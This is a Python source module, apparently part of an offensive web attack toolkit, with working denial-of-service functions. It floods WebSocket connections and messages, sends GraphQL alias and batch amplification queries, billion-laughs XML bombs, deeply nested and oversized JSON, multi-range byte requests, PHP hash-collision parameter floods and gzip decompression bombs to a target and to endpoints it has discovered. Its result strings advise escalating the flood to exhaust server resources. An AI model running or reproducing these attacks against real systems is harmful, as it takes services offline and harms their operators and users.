from __future__ import annotations

import asyncio
import gzip
import io
import json
import statistics
import time

import aiohttp

from ._base import _tool_available
from .state import STATE


async def websocket_flood(url: str, num_connections: int = 100, duration_seconds: int = 30) -> dict:
    num_connections = min(num_connections, 500)
    duration_seconds = min(duration_seconds, 60)
    ws_url = url.replace("https://", "wss://").replace("http://", "ws://")

    connected = 0
    failed = 0
    sessions_and_ws: list[tuple] = []

    async def _connect():
        nonlocal connected, failed
        try:
            sess = aiohttp.ClientSession()
            ws = await asyncio.wait_for(
                sess.ws_connect(ws_url, ssl=False, heartbeat=None), timeout=5,
            )
            sessions_and_ws.append((sess, ws))
            nonlocal connected
            connected += 1
        except Exception:
            nonlocal failed
            failed += 1

    batch = 25
    for i in range(0, num_connections, batch):
        await asyncio.gather(
            *[_connect() for _ in range(min(batch, num_connections - i))],
            return_exceptions=True,
        )

    await asyncio.sleep(duration_seconds)

    for sess, ws in sessions_and_ws:
        try:
            await ws.close()
            await sess.close()
        except Exception:
            pass

    return {
        "ws_url": ws_url, "attempted": num_connections,
        "connected": connected, "failed": failed,
        "held_seconds": duration_seconds,
        "vulnerable": connected > num_connections * 0.4,
        "assessment": f"Established {connected}/{num_connections} WebSocket connections held for {duration_seconds}s",
    }


async def websocket_message_flood(
    url: str, num_connections: int = 50, duration_seconds: int = 30, messages_per_second: int = 100,
) -> dict:
    num_connections = min(num_connections, 200)
    duration_seconds = min(duration_seconds, 60)
    ws_url = url.replace("https://", "wss://").replace("http://", "ws://")

    total_sent = 0
    total_errors = 0
    sessions_and_ws: list[tuple] = []

    async def _connect():
        try:
            sess = aiohttp.ClientSession()
            ws = await asyncio.wait_for(
                sess.ws_connect(ws_url, ssl=False, heartbeat=None), timeout=5,
            )
            sessions_and_ws.append((sess, ws))
        except Exception:
            pass

    await asyncio.gather(*[_connect() for _ in range(num_connections)], return_exceptions=True)

    stop = asyncio.Event()
    interval = 1.0 / max(messages_per_second, 1)

    async def _flood_ws(ws: aiohttp.ClientWebSocketResponse):
        nonlocal total_sent, total_errors
        while not stop.is_set():
            try:
                await ws.send_str("x" * 256)
                total_sent += 1
            except Exception:
                total_errors += 1
                break
            await asyncio.sleep(interval)

    flood_tasks = [asyncio.create_task(_flood_ws(ws)) for _, ws in sessions_and_ws]
    await asyncio.sleep(duration_seconds)
    stop.set()
    await asyncio.gather(*flood_tasks, return_exceptions=True)

    for sess, ws in sessions_and_ws:
        try:
            await ws.close()
            await sess.close()
        except Exception:
            pass

    return {
        "ws_url": ws_url, "connections": len(sessions_and_ws),
        "messages_sent": total_sent, "message_errors": total_errors,
        "duration_seconds": duration_seconds,
        "messages_per_sec_actual": round(total_sent / max(duration_seconds, 1), 1),
    }


async def graphql_attack(endpoint: str, query: str = "__typename", batch_size: int = 100) -> dict:
    results: dict = {}

    if _tool_available("graphql-cop"):
        from ._base import _run_cmd
        r = await _run_cmd(["graphql-cop", "-t", endpoint, "-o", "json"], timeout=60)
        results["graphql_cop"] = {"stdout": r.get("stdout", "")[:4000], "exit_code": r.get("exit_code")}

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        headers = {"Content-Type": "application/json"}

        aliases = "\n".join(f"  a{i}: {query}" for i in range(batch_size))
        alias_payload = json.dumps({"query": "{\n" + aliases + "\n}"})
        try:
            start = time.monotonic()
            async with session.post(
                endpoint, data=alias_payload, headers=headers,
                timeout=aiohttp.ClientTimeout(total=30), ssl=False,
            ) as r:
                elapsed = (time.monotonic() - start) * 1000
                STATE.total_requests_sent += 1
                results["alias_attack"] = {
                    "aliases": batch_size, "status": r.status,
                    "response_ms": round(elapsed, 2),
                    "ms_per_alias": round(elapsed / batch_size, 2),
                    "vulnerable": r.status == 200,
                }
        except asyncio.TimeoutError:
            results["alias_attack"] = {"timeout": True, "batch_size": batch_size, "vulnerable": True}
        except Exception as e:
            results["alias_attack"] = {"error": str(e)}

        batch_payload = json.dumps([{"query": f"{{ {query} }}"} for _ in range(batch_size)])
        try:
            start = time.monotonic()
            async with session.post(
                endpoint, data=batch_payload, headers=headers,
                timeout=aiohttp.ClientTimeout(total=30), ssl=False,
            ) as r:
                elapsed = (time.monotonic() - start) * 1000
                body = await r.text()
                STATE.total_requests_sent += 1
                results["batch_attack"] = {
                    "batch_size": batch_size, "status": r.status,
                    "response_ms": round(elapsed, 2),
                    "batch_supported": r.status == 200 and isinstance(json.loads(body or "null"), list),
                }
        except asyncio.TimeoutError:
            results["batch_attack"] = {"timeout": True, "vulnerable": True}
        except Exception as e:
            results["batch_attack"] = {"error": str(e)}

    vulnerable = any(
        v.get("vulnerable") or v.get("batch_supported") or v.get("timeout")
        for v in results.values() if isinstance(v, dict)
    )
    return {
        "endpoint": endpoint, "batch_size": batch_size, "results": results, "vulnerable": vulnerable,
        "recommendation": (
            f"GraphQL accepts {batch_size}x alias/batch — flood with this payload to multiply server load"
            if vulnerable else "GraphQL has query complexity limits configured"
        ),
    }


async def xml_bomb(url: str) -> dict:
    results: dict = {}

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        entities = "\n".join([
            f'<!ENTITY l{i} "{"&l" + str(i - 1) + ";" * 10 if i > 0 else "lol"}">'
            for i in range(8)
        ])
        xml_payload = (
            f'<?xml version="1.0"?><!DOCTYPE bomb [{entities}]><bomb>&l7;</bomb>'
        )
        for ct in ["application/xml", "text/xml"]:
            tag = ct.split("/")[1]
            try:
                start = time.monotonic()
                async with session.post(
                    url, data=xml_payload.encode(),
                    headers={"Content-Type": ct},
                    timeout=aiohttp.ClientTimeout(total=10), ssl=False,
                ) as r:
                    elapsed = (time.monotonic() - start) * 1000
                    STATE.total_requests_sent += 1
                    results[f"xml_bomb_{tag}"] = {
                        "status": r.status, "response_ms": round(elapsed, 2),
                        "accepted": r.status not in [400, 415, 422],
                    }
            except asyncio.TimeoutError:
                results[f"xml_bomb_{tag}"] = {"timeout": True, "likely_vulnerable": True}
            except Exception as e:
                results[f"xml_bomb_{tag}"] = {"error": str(e)}

        nested: str = '"x"'
        for _ in range(500):
            nested = f'{{"a":{nested}}}'
        try:
            start = time.monotonic()
            async with session.post(
                url, data=nested.encode(),
                headers={"Content-Type": "application/json"},
                timeout=aiohttp.ClientTimeout(total=10), ssl=False,
            ) as r:
                elapsed = (time.monotonic() - start) * 1000
                STATE.total_requests_sent += 1
                results["json_deep_nesting_500"] = {
                    "depth": 500, "status": r.status,
                    "response_ms": round(elapsed, 2),
                    "accepted": r.status not in [400, 413, 422],
                }
        except asyncio.TimeoutError:
            results["json_deep_nesting_500"] = {"timeout": True, "likely_vulnerable": True}
        except Exception as e:
            results["json_deep_nesting_500"] = {"error": str(e)}

        large_array = json.dumps(["x"] * 100000)
        try:
            start = time.monotonic()
            async with session.post(
                url, data=large_array.encode(),
                headers={"Content-Type": "application/json"},
                timeout=aiohttp.ClientTimeout(total=10), ssl=False,
            ) as r:
                elapsed = (time.monotonic() - start) * 1000
                STATE.total_requests_sent += 1
                results["json_large_array_100k"] = {
                    "status": r.status, "response_ms": round(elapsed, 2),
                    "accepted": r.status not in [400, 413],
                }
        except asyncio.TimeoutError:
            results["json_large_array_100k"] = {"timeout": True, "likely_vulnerable": True}
        except Exception as e:
            results["json_large_array_100k"] = {"error": str(e)}

    vulnerable = any(
        v.get("likely_vulnerable") or (v.get("accepted") and v.get("response_ms", 0) > 2000)
        for v in results.values() if isinstance(v, dict)
    )
    return {
        "url": url, "results": results, "vulnerable": vulnerable,
        "recommendation": (
            "XML/JSON parser has no depth/entity limits — bomb payloads accepted"
            if vulnerable else "Parser limits appear configured"
        ),
    }


async def byte_range_dos(
    url: str, num_ranges: int = 128, concurrent: int = 50, duration_seconds: int = 30,
) -> dict:
    from .flood_l7 import http_flood
    num_ranges = min(num_ranges, 1000)
    range_val = ",".join(f"{i}-{i}" for i in range(num_ranges))
    result = await http_flood(
        url=url, method="GET", concurrent=min(concurrent, 500),
        duration_seconds=min(duration_seconds, 120),
        headers={"Range": f"bytes={range_val}", "Accept-Ranges": "bytes"},
    )
    result["attack_type"] = "byte_range_dos"
    result["ranges_per_request"] = num_ranges
    result["amplification_note"] = f"Each request forces server to process {num_ranges} separate byte ranges"
    return result


async def hash_collision_dos(url: str, num_params: int = 5000, duration_seconds: int = 30) -> dict:
    num_params = min(num_params, 50000)
    concurrent = 20
    duration_seconds = min(duration_seconds, 60)

    generic_body = "&".join(f"param_{i}={i}" for i in range(num_params))
    php_keys = ["Oo", "Op", "Oq", "Or", "Os", "Ot", "Ou", "Ov", "Ow", "Ox",
                "Oy", "Oz", "PP", "PQ", "PR", "PS", "PT", "PU", "PV", "PW"]
    php_body = "&".join(f"{k}=1" for k in php_keys * (num_params // len(php_keys)))

    results: dict = {}
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        for label, body in [("generic_mass_params", generic_body), ("php_collision_keys", php_body)]:
            times: list[float] = []
            errors = 0
            stop = asyncio.Event()

            async def _send(b: str = body):
                nonlocal errors
                while not stop.is_set():
                    try:
                        start = time.monotonic()
                        async with session.post(
                            url, data=b,
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=aiohttp.ClientTimeout(total=30), ssl=False,
                        ) as r:
                            times.append((time.monotonic() - start) * 1000)
                            STATE.total_requests_sent += 1
                    except Exception:
                        errors += 1

            workers = [asyncio.create_task(_send()) for _ in range(concurrent)]
            await asyncio.sleep(duration_seconds)
            stop.set()
            await asyncio.gather(*workers, return_exceptions=True)

            results[label] = {
                "params_per_request": num_params,
                "requests_sent": len(times),
                "avg_ms": round(statistics.mean(times), 2) if times else None,
                "errors": errors,
            }

    return {
        "url": url, "num_params": num_params, "results": results,
        "recommendation": "Increase num_params if server shows high response times — parser is not limiting parameter count",
    }


async def test_large_payload(url: str, payload_size_kb: int = 1024, method: str = "POST") -> dict:
    payload_size_kb = min(payload_size_kb, 10240)
    probe_sizes = sorted(set(s for s in [1, 16, 128, 512, payload_size_kb] if s <= payload_size_kb))
    results = []

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        for size_kb in probe_sizes:
            payload = b"A" * (size_kb * 1024)
            try:
                start = time.monotonic()
                async with session.request(
                    method, url, data=payload,
                    headers={"Content-Type": "application/octet-stream"},
                    timeout=aiohttp.ClientTimeout(total=30), ssl=False,
                ) as r:
                    elapsed = (time.monotonic() - start) * 1000
                    STATE.total_requests_sent += 1
                    results.append({
                        "size_kb": size_kb, "status": r.status,
                        "response_ms": round(elapsed, 2),
                        "accepted": r.status not in [400, 413, 415, 422],
                    })
            except Exception as e:
                results.append({"size_kb": size_kb, "error": str(e)})

    max_accepted = max((r["size_kb"] for r in results if r.get("accepted")), default=0)
    return {
        "url": url, "method": method, "test_results": results,
        "max_accepted_kb": max_accepted,
        "vulnerable": max_accepted >= 512,
        "recommendation": (
            f"Server accepts up to {max_accepted}KB — flood with large payloads for resource exhaustion"
            if max_accepted > 0 else "Server rejects large payloads"
        ),
    }


async def gzip_bomb_upload(url: str, method: str = "POST", uncompressed_mb: int = 50) -> dict:
    uncompressed_mb = min(uncompressed_mb, 500)
    raw = bytes(uncompressed_mb * 1024 * 1024)
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", compresslevel=9) as f:
        f.write(raw)
    compressed = buf.getvalue()
    ratio = round(len(raw) / max(len(compressed), 1), 1)

    endpoints = [url] + [
        e.get("url", "") for e in STATE.discovered_endpoints
        if e.get("method", "GET") in ("POST", "PUT") and e.get("url")
    ][:5]

    results = []
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, limit_per_host=0)) as session:
        for ep in endpoints[:6]:
            if not ep:
                continue
            try:
                start = time.monotonic()
                async with session.request(
                    method, ep,
                    data=compressed,
                    headers={
                        "Content-Encoding": "gzip",
                        "Content-Type": "application/octet-stream",
                    },
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=20),
                ) as r:
                    elapsed = (time.monotonic() - start) * 1000
                    STATE.total_requests_sent += 1
                    accepted = r.status not in (400, 411, 413, 415, 422)
                    results.append({
                        "url": ep, "status": r.status,
                        "response_ms": round(elapsed, 2),
                        "server_decompressed": accepted,
                    })
            except Exception as e:
                results.append({"url": ep, "error": str(e)})

    accepted = [r for r in results if r.get("server_decompressed")]
    return {
        "attack_type": "gzip_bomb_upload",
        "compressed_bytes": len(compressed),
        "uncompressed_bytes": len(raw),
        "amplification_ratio": ratio,
        "results": results,
        "endpoints_accepted": len(accepted),
        "vulnerable": len(accepted) > 0,
        "recommendation": (
            f"{len(accepted)} endpoints accepted gzip body — server decompresses {uncompressed_mb}MB per {len(compressed)//1024}KB request"
            if accepted else "No endpoints accepted Content-Encoding: gzip body"
        ),
    }
